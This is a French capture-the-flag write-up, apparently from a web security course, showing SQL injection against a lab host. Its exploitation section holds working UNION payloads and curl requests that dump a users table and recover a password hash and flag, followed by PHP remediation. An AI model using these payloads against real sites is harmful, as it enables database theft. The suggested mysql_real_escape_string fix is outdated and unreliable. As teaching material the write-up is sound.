# SQL Injection

## Exploitation

Sur la page member, on se rend compte que l'on peut provoquer une erreur MySql en passant le caractère `'` dans la textbox.

```bash
curl -s 'http://192.168.99.100/?page=member&id=%27&Submit=Submit' | grep error
<pre>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1</pre>
```

On peut certainement faire une injection SQL.

On utilise cette query pour recuperer les tables et colonnes de la DB:

```sql
1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
```

```bash
curl 'http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit'
```

On se rend compte qu'il y a une table `user` avec les colonnes `user_id|town|planet|country|last_name|first_name|Commentaire|countersign`.

On utilise ces query pour récupérer des datas de la table `user`:

```sql
`1 UNION SELECT first_name,Commentaire from users`
`1 UNION SELECT first_name,countersign from users`
```

```bash
curl 'http://192.168.99.100/?page=member&id=1+UNION+SELECT+first_name%2CCommentaire+from+users&Submit=Submit' | grep Flag

<br>First name: Flag<br>Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !</pre><table width=50%>
```

```bash
curl 'http://192.168.99.100/?page=member&id=1+UNION+SELECT+first_name%2Ccountersign+from+users&Submit=Submit' | grep Flag

 <br>First name: Flag<br>Surname : 5ff9d0165b4f92b14994e5c685cdce28</pre><table width=50%>

```

En faisant un md5 reverse de `5ff9d0165b4f92b14994e5c685cdce28`, on obtient `FortyTwo`, donc en lower `fortytwo`

```bash
$> echo -n fortytwo | shasum -a 256
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Resolutions

En PHP, on peut utiliser des prepared statement:

```php
<?php
/* Execute a prepared statement by passing an array of values */
$sql = 'SELECT name, colour, calories
    FROM fruit  WHERE colour = :colour';
$sth = $dbh->prepare($sql, array(PDO::ATTR_CURSOR => PDO::CURSOR_FWDONLY));
$sth->execute(array(':colour' => 'red'));
$red = $sth->fetchAll();
?>
```

Ou plus simplement la fonction `mysql_real_escape_string` pour mysql:

```php
$query = sprintf("SELECT * FROM users WHERE user='%s' AND password='%s'",
            mysql_real_escape_string($user),
            mysql_real_escape_string($password));
```

